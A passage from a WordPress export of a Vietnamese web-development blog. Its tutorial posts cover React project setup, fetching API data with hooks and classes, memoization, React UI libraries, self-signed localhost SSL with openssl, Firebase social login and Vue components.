4. Routing Module

5. UI/UX Module
-- Boottrap hoặc Reacttrap
-- SCSS + BEM
-- Material UI
-- Ant Design

<h2>II. Một ví dụ cài đặt 1 dự án ReactJS</h2>
<pre>
npm init -y
// React
npm i -D react react-dom react-router-dom @reduxjs/toolkit 
// UI/UX
npm i -D antd @ant-design/pro-layout

// Webpack - core:
npm i -D @babel/core babel-loader @babel/preset-env @babel/preset-react

// Webpack - server
npm i -D webpack webpack-cli webpack-dev-server

// Webpack - css loader
npm i -D style-loader css-loader sass sass-loader less less-loader

// Webpack - file loader(image)
npm i -D file-loader

// Webpack - typscript loader
npm i -D typescript ts-loader

// Webpack - plugin: tạo file html, tách file css
npm i -D html-webpack-plugin mini-css-extract-plugin

</pre>


///. Vấn đề SEO
-- NextJS



]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1396</wp:post_id>
		<wp:post_date><![CDATA[2021-07-15 02:00:30]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-07-14 19:00:30]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-07-15 02:00:30]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-07-14 19:00:30]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[reactjs-2-cau-truc-thu-muc-va-quan-ly-cac-module]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="reactjs"><![CDATA[ReactJS]]></category>
						</item>
					<item>
		<title><![CDATA[React-GetAPI: 2. StateManager by Reducer and FetchData by Component]]></title>
		<link>https://duycode.com/2021/07/05/react-getapi-2-statemanager-by-reducer-and-fetchdata-by-component/</link>
		<pubDate>Sun, 04 Jul 2021 19:00:27 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1477</guid>
		<description></description>
		<content:encoded><![CDATA[<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ReactJS</title>
</head>

<body>
    <div id="app"></div>
    <script crossorigin src="https://unpkg.com/react@17/umd/react.development.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@17/umd/react-dom.development.js"></script>
    <script src="https://unpkg.com/babel-standalone@6/babel.min.js"></script>

    <script type="text/babel">
        const { useState, useEffect, useReducer } = React;

        //1. Khai báo state
        const initialUser = {
            data: {},
            error: ''
        }
        //2. Khai báo Reducer
        const userReducer = (state = initialUser, action) => {
            switch (action.type) {
                case 'FETCH_USER_SUCCESS': {
                    return {
                        data: action.data,
                        error: ''
                    }
                }
                case 'FETCH_USER_FAILED': {
                    return {
                        data: {},
                        error: 'Lỗi: ' + action.error
                    }
                }
                default: return state;
            }
        }

        function App(props) {
            const [userID, setUserID] = useState(1);
            const [loading, setLoading] = useState(false);
            //3. Khai báo hook: useReducer
            const [user, userDispatch] = useReducer(userReducer, initialUser)

            //4. Fake API
            const apiFakeData = async (id) => {
                try {
                    let url = `https://reqres.in/api/users/${id}`;
                    let response = await fetch(url);
                    if (response.ok) {
                        let responseJSON = await response.json();
                        userDispatch({
                            type: 'FETCH_USER_SUCCESS',
                            data: responseJSON.data,
                        })
                    } else {
                        console.log("Lỗi server");
                        userDispatch({
                            type: 'FETCH_USER_FAILED',
                            error: response.status,
                        })
                    }
                } catch (error) {
                    console.log("Lỗi kết nối: ", error);
                    userDispatch({
                        type: 'FETCH_USER_FAILED',
                        error: error.toString()
                    })
                } finally {
                    setLoading(false)
                }
            }

            // Giả sử cho setTimeout 500ms để thấy loading...
            const getUser = (e) => {
                let id = e.target.value;
                setUserID(id);
                setLoading(true);
                setTimeout(() => {
                    apiFakeData(id)
                }, 500);
            }

            // Khởi động lấy data luôn, rồi lưu lên reducer
            useEffect(() => {
                apiFakeData(userID)
            }, [])

            return (
                <div>
                    <input type="number" value={userID} onChange={getUser} />
                    {loading ? <p>Loading...</p> : <div><p>{user.error}</p><p>{JSON.stringify(user.data, null, 4)}</p></div>}
                </div>
            )
        }

        ReactDOM.render(
            <App />,
            document.getElementById('app')
        );
    </script>
</body>

</html>
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1477</wp:post_id>
		<wp:post_date><![CDATA[2021-07-05 02:00:27]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-07-04 19:00:27]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-07-05 02:00:27]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-07-04 19:00:27]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[react-getapi-2-statemanager-by-reducer-and-fetchdata-by-component]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="reactjs"><![CDATA[ReactJS]]></category>
						</item>
					<item>
		<title><![CDATA[ES6 – Kỹ thuật Memoization]]></title>
		<link>https://duycode.com/2021/07/21/es6-ky-thuat-memoization/</link>
		<pubDate>Wed, 21 Jul 2021 07:31:14 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1492</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. Giả sử ta có 1 chương trình rất nặng mỗi lần tính toán như sau:</h2>
<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Demo Memoization</title>
</head>

<body>
    <script>
        // Giả sử ta có 1 function chạy rất nặng như sau
        const expensiveFunction = (number) => {
            const start = new Date();
            console.log("Start expensiveFunction", start.getTime());
            while (new Date() - start < 2000);
            console.log("End expensiveFunction", new Date().getTime());
            const square = number * number;
            return square;
        }

        console.log(expensiveFunction(2)); // Tính toán trả về 4
        console.log(expensiveFunction(3)); // Tính toán trả về 9
        console.log(expensiveFunction(2)); // Vẫn tiếp tục tính toán và trả về 4
    </script>
</body>

</html>
</pre>

<h2>2. Sử dụng kỹ thuật Memoization </h2>
<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Demo Memoization</title>
</head>

<body>
    <script>
        //Dùng kỹ thuật Memoization để lưu những params đã từng được sử dụng và cache => tối ưu hóa những lần run sau
        const expensiveFunction = (number) => {
            // Init cache
            if (!expensiveFunction.cache) {
                expensiveFunction.cache = {};
            }
            // Return cache if found
            const key = `${number}`;
            if (expensiveFunction.cache[key]) return expensiveFunction.cache[key];

            // Calculate
            const start = new Date();
            console.log("Start expensiveFunction", start.getTime());
            while (new Date() - start < 2000);
            console.log("End expensiveFunction", new Date().getTime());
            const square = number * number;

            // Save to cache
            expensiveFunction.cache[key] = square;
            return square;
        }

        console.log(expensiveFunction(2)); // Tính toán và lưu cache, trả về 4
        console.log(expensiveFunction(3)); // Tính toán và lưu cache, trả về 9
        console.log(expensiveFunction(2)); // Lần sau trả về 4 mà không cần tính toán nữa
    </script>
</body>

</html>
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1492</wp:post_id>
		<wp:post_date><![CDATA[2021-07-21 14:31:14]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-07-21 07:31:14]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-07-21 14:31:14]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-07-21 07:31:14]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[es6-ky-thuat-memoization]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="javascript"><![CDATA[Javascript]]></category>
						</item>
					<item>
		<title><![CDATA[UI Component Libraries for ReactJS - 2021]]></title>
		<link>https://duycode.com/2021/07/22/ui-component-libraries-for-reactjs-2021/</link>
		<pubDate>Thu, 22 Jul 2021 13:27:33 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1513</guid>
		<description></description>
		<content:encoded><![CDATA[Ngoài 2 ông tổ ngành Ant Design và Material UI ra thì có:
- Tailwindcss
- ChakraUI: Chắc chắn rồi anh UI này đang rất hot kết hợp với Tailwind thì bá cháy
- React Bootstrap
- Prime React: Cùng sinh thời với 2 ông tổ ngành
- SemanticUI
- FluentUI: Phong cách Microsoft nhất là anh rồi
- Core UI
- Blueprint: Cùng sinh thời với 2 ông tổ ngành, woa nhiều component quá độc lạ
- Hands UI (A Pure Framework make by every one)
- Element UI
- Aha UI
- Mantine UI: Một cái tên rất rất lạ nhưng các component quá đẹp quá phân vân cho dự án tiếp
- Carbon Design System
- Ionic Framework
- Shopify Polaris
- Atlaskit
- RSuite
- Shoelace

- Elasticsearch à nhầm ElasticUI: Quá nhiều component đẹp và chỉ mới được open-source thời gian gần
- RingUI: Dành cho các fan dùng WebStorm nếu ElasticUI 10 điểm thì RingUI không thể nhỏ hơn 9

- SuiteUI: Chị em với Ant Design nhưng khác cha lẫn mẹ
- Geist: Vercel dashboard đang dùng
- ElementUI: Đây là bộ UI khá nổi tiếng cho Vue.js được port sang React chắc chắn sẽ thích
Ngoài ra Evergreen, Bumbag, ...vv có gì sai ae bổ sung]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1513</wp:post_id>
		<wp:post_date><![CDATA[2021-07-22 20:27:33]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-07-22 13:27:33]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-08-07 00:05:37]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-08-07 00:05:37]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[ui-component-libraries-for-reactjs-2021]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="reactjs"><![CDATA[ReactJS]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[React-GetAPI: 1. StateManager and FetchData in one Component]]></title>
		<link>https://duycode.com/2021/07/05/react-getapi-1-statemanager-and-fetchdata-in-one-component/</link>
		<pubDate>Sun, 04 Jul 2021 18:00:09 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1556</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. Sử dụng Hook</h2>
<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>ReactJS</title>
</head>

<body>
    <div id="app"></div>
    <script crossorigin src="https://unpkg.com/react@17/umd/react.development.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@17/umd/react-dom.development.js"></script>
    <script src="https://unpkg.com/babel-standalone@6/babel.min.js"></script>

    <script type="text/babel">
        const { useState, useEffect } = React;

        function Content() {
            const [user, setUser] = useState([]);
            const [userID, setUserID] = useState(1);
            const [loading, setLoading] = useState(false);

            const apiFakeData = async (id) => {
                try {
                    let url = `https://reqres.in/api/users/${id}`;
                    let response = await fetch(url);
                    if (response.ok) {
                        let responseJSON = await response.json();
                        setUser(responseJSON.data);
                    } else if (response.status === 404) {
                        console.log("Lỗi 404");
                        setUser({error: 404});
                    } else {
                        console.log("Lỗi khác");
                        setUser({error: response.status});
                    }
                } catch (error) {
                    console.log("Lỗi kết nối: ", error);
                    setUser({error: error.toString()})
                } finally {
                    setLoading(false)
                }
            }

            // Nếu không dùng cleanup, component bị unmout trong quá trình đang getAPI
            // Lúc đó, update State khi component unmout sẽ gây ra lỗi
            // Đếch hiểu tại sao, cứ dùng hàm cleanup trong useEffect thì khi remove Component đi thì nó cũng tự hết lỗi :3
            useEffect(() => {
                setLoading(true)
                // Cái API này nhanh quá, cho delay 500ms cho chậm lại
                setTimeout(() => {
                    apiFakeData(userID);
                }, 500);

            }, [userID]);

            console.log("Content: Render", loading, userID);
            return (
                <div>
                    <input type="number" value={userID} onChange={e => setUserID(e.target.value)} />
                    {loading ? <p>Loading...</p> : <p>{JSON.stringify(user, null, 2)}</p>}
                </div>
            );

        }

        function App() {
            const [showContent, setShowContent] = useState(true)
            return (
                <div>
                    <button onClick={() => { setShowContent(!showContent) }}>Toggle Content Component</button>
                    {showContent && <Content />}
                </div>
            );

        }

        ReactDOM.render(<App />, document.getElementById('app'));
    </script>
</body>

</html>
</pre>

<h2>2. Sử dụng Class</h2>
<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>ReactJS</title>
</head>

<body>
    <div id="app"></div>
    <script crossorigin src="https://cdnjs.cloudflare.com/ajax/libs/react/15.0.0/react.js"></script>
    <script crossorigin src="https://cdnjs.cloudflare.com/ajax/libs/react/15.0.0/react-dom.js"></script>
    <script src="https://unpkg.com/babel-standalone@6/babel.min.js"></script>

    <script type="text/babel">
        class Content extends React.Component {
            constructor(props) {
                super(props);
                this.isComponentMounted = false;
                this.state = {
                    loading: false,
                    user: [],
                    userID: 1,
                };
            }

            //Hành động thay đổi state bằng api phải để trong componentDidMount và componentDidUpdate
            componentDidMount() {
                this.isComponentMounted = true;
                this.getData(this.state.userID);
            }

            //Chỉ khi thay đổi giá trị userID mới render lại
            componentDidUpdate(prevProps, prevState) {
                if (prevState.userID == this.state.userID) return;
                this.getData(this.state.userID);
            }

            //Dùng isComponentMounted, mục đích là khi Component đã unmount, thì không thể setState được nữa
            //Thử tắt dòng isComponentMounted = false và test Togggle Component biết liền à
            componentWillUnmount() {
                this.isComponentMounted = false;
            }

            getData = (id) => {
                //Bắt đầu load thì để loading: true
                this.setState({ loading: true });
                //Tốc độ cái API này nhanh quá, nên phải để nó Delay 500s :3
                setTimeout(() => {
                    this.apiFakeData(id);
                }, 500);

            }

            apiFakeData = async (id) => {
                try {
                    let url = `https://reqres.in/api/users/${id}`;
                    let response = await fetch(url);
                    if (this.isComponentMounted) {
                        if (response.ok) {
                            let responseJSON = await response.json();
                            this.setState({ user: responseJSON.data });
                        } else if (response.status === 404) {
                            console.log("Lỗi 404");
                            this.setState({ user: { error: 404 } });
                        } else {
                            console.log("Lỗi khác");
                            this.setState({ user: { error: response.status } });
                        }
                    }
                } catch (error) {
                    if (this.isComponentMounted) {
                        console.log("Lỗi kết nối");
                        this.setState({ user: { error: error.toString() } });
                    }
                } finally {
                    this.setState({ loading: false });
                }

            }

            render() {
                console.log("Content: Render");
                return (
                    <div>
                        <input type="number" value={this.state.userID} onChange={e => this.setState({ userID: e.target.value })} />
                        {this.state.loading ? <p>Loading...</p> : <p>{JSON.stringify(this.state.user, null, 2)}</p>}
                    </div>
                );
            }
        }

        class App extends React.Component {
            constructor(props) {
                super(props);
                this.state = {
                    showContent: true,
                };
            }

            // Dùng button Toggle Component để test chức năng isComponentMounted ở Content
            // Trường hợp unmout nhanh quá, mà getAPI về chậm, sau đó lại setState ở Component đã unmount ==> sẽ gây ra lỗi
            // Mục đích dùng "isComponentMounted" để tránh việc setState cho những Component đã unmount
            render() {
                return (
                    <div>
                        <button onClick={() => { this.setState({ showContent: !this.state.showContent }) }}>Toggle Content Component</button>
                        {this.state.showContent && <Content />}
                    </div>
                );
            }
        }

        ReactDOM.render(<App />, document.getElementById('app'));
    </script>
</body>

</html>
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1556</wp:post_id>
		<wp:post_date><![CDATA[2021-07-05 01:00:09]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-07-04 18:00:09]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-07-05 01:00:09]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-07-04 18:00:09]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[react-getapi-1-statemanager-and-fetchdata-in-one-component]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="reactjs"><![CDATA[ReactJS]]></category>
						</item>
					<item>
		<title><![CDATA[Cài SSL cho localhost]]></title>
		<link>https://duycode.com/2021/07/27/cai-ssl-cho-localhost/</link>
		<pubDate>Tue, 27 Jul 2021 05:31:15 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1578</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. Cài đặt OpenSSL</h2>
- Windows không tích hợp sẵn file thực thi openssl, ta cần phải cài đặt nó bằng tay để có thể generate được file .key, .pem, .crt
- Nếu đã cài đặt git-scm => vào "C:\Program Files\Git\usr\bin" => mở CMD tại đây
- Download bản Portable: <a href="https://git-scm.com/download/win" rel="noopener" target="_blank">https://git-scm.com/download/win</a> 
- File "openssl.exe" sẽ nằm trong folder "usr/bin"
- Mở CMD trong thư mục "usr/bin" --> mở CMD tại đây, ta đã có thể sử dụng lệnh "openssl"

<h2>2. Cài đặt SSL cho Live Server</h2>
<h3>1. Tạo file localhost.key và localhost.pem</h3>
- Chạy từng lệnh sau, nhớ đổi đường dẫn để lưu vào vị trí khác:
<pre>openssl genrsa -aes256 -passout pass:123456 -out %UserProfile%\.vscode\https\liveserver.key 2048 </pre>
<pre>openssl req -passin pass:123456 -days 3650 -new -newkey rsa:2048 -key %UserProfile%\.vscode\https\liveserver.key -x509 -out %UserProfile%\.vscode\https\liveserver.pem -subj "/C=US/ST=Oregon/L=Portland/O=Company Name/OU=Org/CN=www.example.com"</pre>
</pre>

<h3>2. Setting VSCode</h3>
-- Tại settings.json
-- Điền tên username cho đúng
-- "123456": là mật khẩu được tạo ở trên
- "enable": true ==> để bắt đầu sử dụng https
<pre>
    "liveServer.settings.port": 5501,
    "liveServer.settings.root": "/",
    "liveServer.settings.CustomBrowser": "chrome",
    "liveServer.settings.https": {
      "enable": true,
      "cert": "/Users/<username>/.vscode/https/liveserver.pem",
      "key": "/Users/<username>/.vscode/https/liveserver.key",
      "passphrase": "123456"
    }
</pre>

<h2>3. Cài đặt SSL cho ReactS</h2>
-- Tạo 2 file key.pem và cert.pem như sau:
<pre>
openssl req -days 3650 -nodes -x509 -newkey rsa:4096 -keyout C:\Users\duyk3\Desktop\key.pem -out C:\Users\duyk3\Desktop\cert.pem -subj "/C=US/ST=Oregon/L=Portland/O=Company Name/OU=Org/CN=localhost"
</pre>
-- Thêm vào file .env
<pre>
HTTPS=true
SSL_CRT_FILE=C:/Users/duyk3/.vscode/https/cert.pem
SSL_KEY_FILE=C:/Users/duyk3/.vscode/https/key.pem
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1578</wp:post_id>
		<wp:post_date><![CDATA[2021-07-27 12:31:15]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-07-27 05:31:15]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-08-07 00:29:59]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-08-07 00:29:59]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[cai-ssl-cho-localhost]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="mang-may-tinh"><![CDATA[Mạng Máy Tính]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[Firebase-Authentication: 1. Login - Logout]]></title>
		<link>https://duycode.com/2021/07/16/firebase-authentication-1-login-logout/</link>
		<pubDate>Thu, 15 Jul 2021 18:00:04 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1583</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. Những lưu ý khi cài đặt Login Facebook</h2>
1. Tạo project mới tại: <a href="https://developers.facebook.com/apps/" rel="noopener" target="_blank">https://developers.facebook.com/apps/</a>
2. Khởi tạo project mới: ban đầu chọn: URL site: "http://localhost:5500/"
3. Trong phần Settings App của Facebook
-- Valid OAuth Redirect URIs: điền 'OAuth redirect URI' của bên Firebase cung cấp
4. Trong phần Settings Authentication của Firebase
-- Điền App ID và App secret do bên Facebook cung cấp
<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Demo Firebase</title>
    <script src="https://www.gstatic.com/firebasejs/ui/4.8.1/firebase-ui-auth.js"></script>
    <link type="text/css" rel="stylesheet" href="https://www.gstatic.com/firebasejs/ui/4.8.1/firebase-ui-auth.css" />
</head>

<body>
    <div id="app">
        <h3>Welcome to My Awesome App</h3>
        <div id="auth-info"></div>
        <div id="firebaseui-auth-container"></div>
        <div id="loader">Loading...</div>
    </div>

    <!-- Link setup firebase: https://firebase.google.com/docs/web/setup -->
    <script src="https://www.gstatic.com/firebasejs/8.8.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.8.0/firebase-auth.js"></script>

    <script>
        // Logout Google: "https://myaccount.google.com/permissions"
        // Logout Facebook: "https://www.facebook.com/settings/?tab=applications"
        var firebaseConfig = {
            apiKey: "AIzaSyADcAyM-3Fb7ZJdJf86yLKFUnZmxx-QHmU",
            authDomain: "duycode-77e9a.firebaseapp.com",
        };
        firebase.initializeApp(firebaseConfig);
        let ui = new firebaseui.auth.AuthUI(firebase.auth());
    </script>

    <script>
        
        // 1. Kiểm tra xem Login chưa để hiển thị màn hình tương ứng
        firebase.auth().onAuthStateChanged((user) => {
            if (user) {
                // 1.1. Đã login thì lấy thông tin user
                console.log(user);
                document.getElementById('auth-info').innerHTML = `
                            <img src="${user.providerData[0].photoURL}"></img>
                            <div>Xin chào: ${user.providerData[0].displayName}</div>
                            <div>UID: ${user.uid}</div>
                            <div>Social: ${user.providerData[0].providerId}</div>
                            <div><button onclick="signout()">Sign out</button></div>
                        `;
            } else {
                // 1.2. Chưa login thì hiển thị giao diện login
                document.getElementById('auth-info').innerHTML = ""
                ui.start('#firebaseui-auth-container', uiConfig);
            }
        });

        // 2. Hiển thị giao diện Login
        let uiConfig = {
            callbacks: {
                signInSuccessWithAuthResult: function (authResult, redirectUrl) {
                    return false;
                },
                uiShown: function () {
                    // 2.1. Khi có giao diện rồi thì tắt loader
                    document.getElementById('loader').style.display = 'none';
                }
            },
            // 2.2. Dạng đăng nhập: popup
            signInFlow: 'popup',
            // 2.3. Link chuyển hướng khi đăng nhập thành công, không chuyển hướng thì để yên cho tao :3
            // signInSuccessUrl: '/',
            signInOptions: [
                // a. Đăng nhập điện thoại
                {
                    provider: firebase.auth.PhoneAuthProvider.PROVIDER_ID,
                    recaptchaParameters: {
                        type: 'image',
                        size: 'normal',
                        badge: 'bottomleft'
                    },
                    defaultCountry: 'VN',
                },
                // c. Đăng nhập bằng Facebook
                firebase.auth.GoogleAuthProvider.PROVIDER_ID,
                firebase.auth.FacebookAuthProvider.PROVIDER_ID,
            ],
            tosUrl: '/link-terms-of-service',
            privacyPolicyUrl: '/link-privacy-policy'
        };

        // 3. Logout
        let signout = () => {
            firebase.auth().signOut()
                .then(() => {
                    console.log("You are sign out");
                })
                .catch((error) => {
                    console.log("SignOut faild");
                });
        }
    </script>
</body>

</html>
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1583</wp:post_id>
		<wp:post_date><![CDATA[2021-07-16 01:00:04]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-07-15 18:00:04]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-07-16 01:00:04]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-07-15 18:00:04]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[firebase-authentication-1-login-logout]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="firebase"><![CDATA[FireBase]]></category>
						</item>
					<item>
		<title><![CDATA[VueJS - 1. Khởi tạo Vue và Component]]></title>
		<link>https://duycode.com/2021/07/15/vuejs-1-khoi-tao-vue-va-component/</link>
		<pubDate>Wed, 14 Jul 2021 18:00:22 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1622</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. VueJS 2: Khởi tạo Vue và Component</h2>
<pre>
<!DOCTYPE html>
<html lang="en">

<body>
    <div id="app1">1. Vue2 mount by "el"</div>
    <div id="app2">2. Vue2 mount by "$mount"</div>
    <div id="app3">3. Dữ liệu sẽ bị thay thế</div>

    <div id="app4">
        <component1></component1>
        <component2></component2>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"></script>
    <script>
        //1. Có 2 cách Vue mount vào element: dùng "el" hoặc dùng "$mount"
        let app1 = new Vue({
            el: "#app1",
        });
        let app2 = new Vue({
        }).$mount("#app2");

        //2. Khi dùng "template" Vue sẽ replace hoàn toàn dữ liệu của element có id được chỉ định
        let app3 = new Vue({
            template: `<p>3. Vue2 use template</p>`
        }).$mount("#app3");

        //3. Khai báo component dạng global
        Vue.component("component1", {
            template: "<div>This is component 1</div>"
        });

        //4. Khai báo component dạng local
        let app4 = new Vue({
            el: "#app4",
            components: {
                component2: {
                    template: "<div>This is component 2</div>"
                }
            }
        });
    </script>
</body>

</html>
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1622</wp:post_id>
		<wp:post_date><![CDATA[2021-07-15 01:00:22]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-07-14 18:00:22]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-07-15 01:00:22]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-07-14 18:00:22]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[vuejs-1-khoi-tao-vue-va-component]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="vuejs-v2"><![CDATA[VueJS-v2]]></category>
						</item>
					<item>
		<title><![CDATA[VueJS3 - Tutorial: 3. Lifecycle]]></title>
		<link>https://duycode.com/2021/07/15/vuejs-tutorial-3-lifecycle/</link>
		<pubDate>Wed, 14 Jul 2021 20:00:42 +0000</pubDate>
